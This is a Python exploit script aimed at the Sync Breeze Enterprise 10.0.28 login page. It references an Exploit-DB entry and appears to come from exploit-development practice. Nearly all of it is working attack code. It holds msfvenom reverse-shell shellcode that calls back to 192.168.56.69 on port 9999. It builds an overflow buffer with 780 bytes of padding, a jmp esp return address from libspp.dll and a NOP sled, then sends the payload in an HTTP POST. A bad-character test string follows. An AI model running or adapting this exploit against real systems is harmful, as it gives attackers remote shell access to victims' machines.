"""
Vulnerable App - Sync Breeze Exterprise 10.0.28 (https://www.exploit-db.com/apps/959f770895133edc4cf65a4a02d12da8-syncbreezeent_setup_v10.0.28.exe)
Exploit DB Reference - https://www.exploit-db.com/exploits/42928
"""

import requests

# msfvenom --arch x86 --format python  --platform Windows  -p windows/shell_reverse_tcp LPORT=9999 LHOST=192.168.56.69 --bad-chars "\x00\x0a\x0d\x25\x26\x2b\x3d" 
buf =  b""
buf += b"\xdb\xda\xd9\x74\x24\xf4\xba\xbf\x79\xbf\x44\x5e"
buf += b"\x31\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x79"
buf += b"\x7d\x5d\xb1\x79\x96\x23\x3a\x81\x67\x44\xb2\x64"
buf += b"\x56\x44\xa0\xed\xc9\x74\xa2\xa3\xe5\xff\xe6\x57"
buf += b"\x7d\x8d\x2e\x58\x36\x38\x09\x57\xc7\x11\x69\xf6"
buf += b"\x4b\x68\xbe\xd8\x72\xa3\xb3\x19\xb2\xde\x3e\x4b"
buf += b"\x6b\x94\xed\x7b\x18\xe0\x2d\xf0\x52\xe4\x35\xe5"
buf += b"\x23\x07\x17\xb8\x38\x5e\xb7\x3b\xec\xea\xfe\x23"
buf += b"\xf1\xd7\x49\xd8\xc1\xac\x4b\x08\x18\x4c\xe7\x75"
buf += b"\x94\xbf\xf9\xb2\x13\x20\x8c\xca\x67\xdd\x97\x09"
buf += b"\x15\x39\x1d\x89\xbd\xca\x85\x75\x3f\x1e\x53\xfe"
buf += b"\x33\xeb\x17\x58\x50\xea\xf4\xd3\x6c\x67\xfb\x33"
buf += b"\xe5\x33\xd8\x97\xad\xe0\x41\x8e\x0b\x46\x7d\xd0"
buf += b"\xf3\x37\xdb\x9b\x1e\x23\x56\xc6\x76\x80\x5b\xf8"
buf += b"\x86\x8e\xec\x8b\xb4\x11\x47\x03\xf5\xda\x41\xd4"
buf += b"\xfa\xf0\x36\x4a\x05\xfb\x46\x43\xc2\xaf\x16\xfb"
buf += b"\xe3\xcf\xfc\xfb\x0c\x1a\x52\xab\xa2\xf5\x13\x1b"
buf += b"\x03\xa6\xfb\x71\x8c\x99\x1c\x7a\x46\xb2\xb7\x81"
buf += b"\x01\x7d\xef\xb1\x94\x15\xf2\xc1\x31\xe9\x7b\x27"
buf += b"\x57\xe5\x2d\xf0\xc0\x9c\x77\x8a\x71\x60\xa2\xf7"
buf += b"\xb2\xea\x41\x08\x7c\x1b\x2f\x1a\xe9\xeb\x7a\x40"
buf += b"\xbc\xf4\x50\xec\x22\x66\x3f\xec\x2d\x9b\xe8\xbb"
buf += b"\x7a\x6d\xe1\x29\x97\xd4\x5b\x4f\x6a\x80\xa4\xcb"
buf += b"\xb1\x71\x2a\xd2\x34\xcd\x08\xc4\x80\xce\x14\xb0"
buf += b"\x5c\x99\xc2\x6e\x1b\x73\xa5\xd8\xf5\x28\x6f\x8c"
buf += b"\x80\x02\xb0\xca\x8c\x4e\x46\x32\x3c\x27\x1f\x4d"
buf += b"\xf1\xaf\x97\x36\xef\x4f\x57\xed\xab\x60\x12\xaf"
buf += b"\x9a\xe8\xfb\x3a\x9f\x74\xfc\x91\xdc\x80\x7f\x13"
buf += b"\x9d\x76\x9f\x56\x98\x33\x27\x8b\xd0\x2c\xc2\xab"
buf += b"\x47\x4c\xc7"

data = "username="
data += ("A" * 780)             #No of A's
#0x10090c83 : jmp esp |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)
data += "\x83\x0c\x09\x10"      #EIP 
data += ("\x90" * 16)
data += buf                    #shellcode
data += "&password=A"

head ={"Content-Type":"application/x-www-form-urlencoded"}
r = requests.post ("http://localhost/login", data=data, headers = head)
print r.text



badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"\
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"\
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"\
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"\
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"\
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"\
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"\
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
